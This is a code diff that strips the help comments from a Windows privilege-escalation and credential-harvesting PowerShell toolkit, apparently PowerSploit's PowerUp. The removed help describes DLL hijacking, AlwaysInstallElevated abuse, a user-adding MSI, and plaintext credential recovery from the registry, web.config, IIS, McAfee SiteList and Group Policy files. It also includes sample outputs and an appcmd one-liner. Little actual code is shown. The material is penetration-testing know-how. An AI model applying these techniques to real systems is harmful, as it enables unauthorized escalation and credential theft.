-    .PARAMETER Command
-
-        Custom command to execute instead of user creation.
-#>
 
     [CmdletBinding()]
     param(
@@ -2539,23 +1556,6 @@ function Write-HijackDll {
     )
 
     function local:Invoke-PatchDll {
-    <#
-        .SYNOPSIS
-
-            Helpers that patches a string in a binary byte array.
-
-        .PARAMETER DllBytes
-
-            The binary blob to patch.
-
-        .PARAMETER SearchString
-
-            The string to replace in the blob.
-
-        .PARAMETER ReplaceString
-
-            The string to replace SearchString with.
-    #>
 
         [CmdletBinding()]
         param(
@@ -2672,24 +1672,6 @@ function Write-HijackDll {
 ########################################################
 
 function Get-RegistryAlwaysInstallElevated {
-<#
-    .SYNOPSIS
-
-        Checks if any of the AlwaysInstallElevated registry keys are set.
-
-    .DESCRIPTION
-
-        Returns $True if the HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
-        or the HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated keys
-        are set, $False otherwise. If one of these keys are set, then all .MSI files run with
-        elevated permissions, regardless of current user permissions.
-
-    .EXAMPLE
-
-        PS C:\> Get-RegistryAlwaysInstallElevated
-
-        Returns $True if any of the AlwaysInstallElevated registry keys are set.
-#>
 
     [CmdletBinding()]
     Param()
@@ -2731,26 +1713,6 @@ function Get-RegistryAlwaysInstallElevated {
 
 
 function Get-RegistryAutoLogon {
-<#
-    .SYNOPSIS
-
-        Finds any autologon credentials left in the registry.
-
-    .DESCRIPTION
-
-        Checks if any autologon accounts/credentials are set in a number of registry locations.
-        If they are, the credentials are extracted and returned as a custom PSObject.
-
-    .EXAMPLE
-
-        PS C:\> Get-RegistryAutoLogon
-
-        Finds any autologon credentials left in the registry.
-
-    .LINK
-
-        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb
-#>
 
     [CmdletBinding()]
     Param()
@@ -2782,24 +1744,6 @@ function Get-RegistryAutoLogon {
 }
 
 function Get-ModifiableRegistryAutoRun {
-<#
-    .SYNOPSIS
-
-        Returns any elevated system autoruns in which the current user can
-        modify part of the path string.
-
-    .DESCRIPTION
-
-        Enumerates a number of autorun specifications in HKLM and filters any
-        autoruns through Get-ModifiablePath, returning any file/config locations
-        in the found path strings that the current user can modify.
-
-    .EXAMPLE
-
-        PS C:\> Get-ModifiableRegistryAutoRun
-
-        Return vulneable autorun binaries (or associated configs).
-#>
 
     [CmdletBinding()]
     Param()
@@ -2847,25 +1791,6 @@ function Get-ModifiableRegistryAutoRun {
 ########################################################
 
 function Get-ModifiableScheduledTaskFile {
-<#
-    .SYNOPSIS
-
-        Returns scheduled tasks where the current user can modify any file
-        in the associated task action string.
-
-    .DESCRIPTION
-
-        Enumerates all scheduled tasks by recursively listing "$($ENV:windir)\System32\Tasks"
-        and parses the XML specification for each task, extracting the command triggers.
-        Each trigger string is filtered through Get-ModifiablePath, returning any file/config
-        locations in the found path strings that the current user can modify.
-
-    .EXAMPLE
-
-        PS C:\> Get-ModifiableScheduledTaskFile
-
-        Return scheduled tasks with modifiable command strings.
-#>
 
     [CmdletBinding()]
     Param()
@@ -2913,22 +1838,6 @@ function Get-ModifiableScheduledTaskFile {
 
 
 function Get-UnattendedInstallFile {
-<#
-    .SYNOPSIS
-
-        Checks several locations for remaining unattended installation files,
-        which may have deployment credentials.
-
-    .EXAMPLE
-
-        PS C:\> Get-UnattendedInstallFile
-
-        Finds any remaining unattended installation files.
-
-    .LINK
-
-        http://www.fuzzysecurity.com/tutorials/16.html
-#>
 
     $OrigError = $ErrorActionPreference
     $ErrorActionPreference = "SilentlyContinue"
@@ -2956,69 +1865,6 @@ function Get-UnattendedInstallFile {
 
 
 function Get-WebConfig {
-<#
-    .SYNOPSIS
-
-        This script will recover cleartext and encrypted connection strings from all web.config
-        files on the system.  Also, it will decrypt them if needed.
-
-        Author: Scott Sutherland - 2014, NetSPI
-        Author: Antti Rantasaari - 2014, NetSPI
-
-    .DESCRIPTION
-
-        This script will identify all of the web.config files on the system and recover the
-        connection strings used to support authentication to backend databases.  If needed, the
-        script will also decrypt the connection strings on the fly.  The output supports the
-        pipeline which can be used to convert all of the results into a pretty table by piping
-        to format-table.
-
-    .EXAMPLE
-
-        Return a list of cleartext and decrypted connect strings from web.config files.
-
-        PS C:\> Get-WebConfig
-        user   : s1admin
-        pass   : s1password
-        dbserv : 192.168.1.103\server1
-        vdir   : C:\test2
-        path   : C:\test2\web.config
-        encr   : No
-
-        user   : s1user
-        pass   : s1password
-        dbserv : 192.168.1.103\server1
-        vdir   : C:\inetpub\wwwroot
-        path   : C:\inetpub\wwwroot\web.config
-        encr   : Yes
-
-    .EXAMPLE
-
-        Return a list of clear text and decrypted connect strings from web.config files.
-
-        PS C:\>get-webconfig | Format-Table -Autosize
-
-        user    pass       dbserv                vdir               path                          encr
-        ----    ----       ------                ----               ----                          ----
-        s1admin s1password 192.168.1.101\server1 C:\App1            C:\App1\web.config            No  
-        s1user  s1password 192.168.1.101\server1 C:\inetpub\wwwroot C:\inetpub\wwwroot\web.config No  
-        s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\test\web.config       No  
-        s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\web.config            Yes 
-        s3user  s3password 192.168.1.103\server3 D:\App3            D:\App3\web.config            No 
-
-     .LINK
-
-        https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
-        http://www.netspi.com
-        https://raw2.github.com/NetSPI/cmdsql/master/cmdsql.aspx
-        http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
-        http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx
-
-     .NOTES
-
-        Below is an alterantive method for grabbing connection strings, but it doesn't support decryption.
-        for /f "tokens=*" %i in ('%systemroot%\system32\inetsrv\appcmd.exe list sites /text:name') do %systemroot%\system32\inetsrv\appcmd.exe list config "%i" -section:connectionstrings
-#>
 
     [CmdletBinding()]
     Param()
@@ -3160,70 +2006,6 @@ function Get-WebConfig {
 
 
 function Get-ApplicationHost {
- <#
-    .SYNOPSIS
-
-        This script will recover encrypted application pool and virtual directory passwords from the applicationHost.config on the system.
-
-    .DESCRIPTION
-
-        This script will decrypt and recover application pool and virtual directory passwords
-        from the applicationHost.config file on the system.  The output supports the
-        pipeline which can be used to convert all of the results into a pretty table by piping
-        to format-table.
-
-    .EXAMPLE
-
-        Return application pool and virtual directory passwords from the applicationHost.config on the system.
-
-        PS C:\> Get-ApplicationHost
-        user    : PoolUser1
-        pass    : PoolParty1!
-        type    : Application Pool
-        vdir    : NA
-        apppool : ApplicationPool1
-        user    : PoolUser2
-        pass    : PoolParty2!
-        type    : Application Pool
-        vdir    : NA
-        apppool : ApplicationPool2
-        user    : VdirUser1
-        pass    : VdirPassword1!
-        type    : Virtual Directory
-        vdir    : site1/vdir1/
-        apppool : NA
-        user    : VdirUser2
-        pass    : VdirPassword2!
-        type    : Virtual Directory
-        vdir    : site2/
-        apppool : NA
-
-    .EXAMPLE
-
-        Return a list of cleartext and decrypted connect strings from web.config files.
-
-        PS C:\> Get-ApplicationHost | Format-Table -Autosize
-
-        user          pass               type              vdir         apppool
-        ----          ----               ----              ----         -------
-        PoolUser1     PoolParty1!       Application Pool   NA           ApplicationPool1
-        PoolUser2     PoolParty2!       Application Pool   NA           ApplicationPool2
-        VdirUser1     VdirPassword1!    Virtual Directory  site1/vdir1/ NA
-        VdirUser2     VdirPassword2!    Virtual Directory  site2/       NA
-
-    .LINK
-
-        https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
-        http://www.netspi.com
-        http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
-        http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx
-
-    .NOTES
-
-        Author: Scott Sutherland - 2014, NetSPI
-        Version: Get-ApplicationHost v1.0
-        Comments: Should work on IIS 6 and Above
-#>
 
     $OrigError = $ErrorActionPreference
     $ErrorActionPreference = "SilentlyContinue"
@@ -3303,69 +2085,6 @@ function Get-ApplicationHost {
 
 
 function Get-SiteListPassword {
-<#
-    .SYNOPSIS
-
-        Retrieves the plaintext passwords for found McAfee's SiteList.xml files.
-        Based on Jerome Nokin (@funoverip)'s Python solution (in links).
-
-        PowerSploit Function: Get-SiteListPassword
-        Original Author: Jerome Nokin (@funoverip)
-        PowerShell Port: @harmj0y
-        License: BSD 3-Clause
-        Required Dependencies: None
-        Optional Dependencies: None
-
-    .DESCRIPTION
-
-        Searches for any McAfee SiteList.xml in C:\Program Files\, C:\Program Files (x86)\,
-        C:\Documents and Settings\, or C:\Users\. For any files found, the appropriate
-        credential fields are extracted and decrypted using the internal Get-DecryptedSitelistPassword
-        function that takes advantage of McAfee's static key encryption. Any decrypted credentials
-        are output in custom objects. See links for more information.
-
-    .PARAMETER Path
-
-        Optional path to a SiteList.xml file or folder.
-
-    .EXAMPLE
-
-        PS C:\> Get-SiteListPassword
-
-        EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
-        UserName    :
-        Path        : Products/CommonUpdater
-        Name        : McAfeeHttp
-        DecPassword : MyStrongPassword!
-        Enabled     : 1
-        DomainName  :
-        Server      : update.nai.com:80
-
-        EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
-        UserName    : McAfeeService
-        Path        : Repository$
-        Name        : Paris
-        DecPassword : MyStrongPassword!
-        Enabled     : 1
-        DomainName  : companydomain
-        Server      : paris001
-
-        EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
-        UserName    : McAfeeService
-        Path        : Repository$
-        Name        : Tokyo
-        DecPassword : MyStrongPassword!
-        Enabled     : 1
-        DomainName  : companydomain
-        Server      : tokyo000
-
-    .LINK
-
-        https://github.com/funoverip/mcafee-sitelist-pwd-decryption/
-        https://funoverip.net/2016/02/mcafee-sitelist-xml-password-decryption/
-        https://github.com/tfairane/HackStory/blob/master/McAfeePrivesc.md
-        https://www.syss.de/fileadmin/dokumente/Publikationen/2011/SySS_2011_Deeg_Privilege_Escalation_via_Antivirus_Software.pdf
-#>
 
     [CmdletBinding()]
     param(
@@ -3496,42 +2215,6 @@ function Get-SiteListPassword {
 
 
 function Get-CachedGPPPassword {
-<#
-    .SYNOPSIS
-
-        Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences and left in cached files on the host.
-
-        PowerSploit Function: Get-CachedGPPPassword
-        Author: Chris Campbell (@obscuresec), local cache mods by @harmj0y
-        License: BSD 3-Clause
-        Required Dependencies: None
-        Optional Dependencies: None
-     
-    .DESCRIPTION
-
-        Get-CachedGPPPassword searches the local machine for cached for groups.xml, scheduledtasks.xml, services.xml and datasources.xml files and returns plaintext passwords.
-
-    .EXAMPLE
-
-        PS C:\> Get-CachedGPPPassword
-
-
-        NewName   : [BLANK]
-        Changed   : {2013-04-25 18:36:07}
-        Passwords : {Super!!!Password}
-        UserNames : {SuperSecretBackdoor}
-        File      : C:\ProgramData\Microsoft\Group Policy\History\{32C4C89F-7
-                    C3A-4227-A61D-8EF72B5B9E42}\Machine\Preferences\Groups\Gr
-                    oups.xml
-
-    .LINK
-        
-        http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
-        https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
-        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
-        http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
-        http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
-#>
     
     [CmdletBinding()]
     Param()
@@ -3699,18 +2382,6 @@ function Get-CachedGPPPassword {
 
 
 function Write-UserAddMSI {
-<#
-    .SYNOPSIS
-
-        Writes out a precompiled MSI installer that prompts for a user/group addition.
-        This function can be used to abuse Get-RegistryAlwaysInstallElevated.
-
-    .EXAMPLE
-
-        PS C:\> Write-UserAddMSI
-
-        Writes the user add MSI to the local directory.
-#>
 
     $Path = 'UserAdd.msi'
 
@@ -3734,31 +2405,6 @@ function Write-UserAddMSI {
 
 
 function Invoke-AllChecks {
-<#
-    .SYNOPSIS
-
-        Runs all functions that check for various Windows privilege escalation opportunities.
-
-        Author: @harmj0y
-        License: BSD 3-Clause
-
-    .PARAMETER HTMLReport
-
-        Switch. Write a HTML version of the report to SYSTEM.username.html.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-AllChecks
-
-        Runs all escalation checks and outputs a status report for discovered issues.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-AllChecks -HTMLReport
-
-        Runs all escalation checks and outputs a status report to SYSTEM.username.html
-        detailing any discovered issues.
-#>
 
     [CmdletBinding()]
     Param(
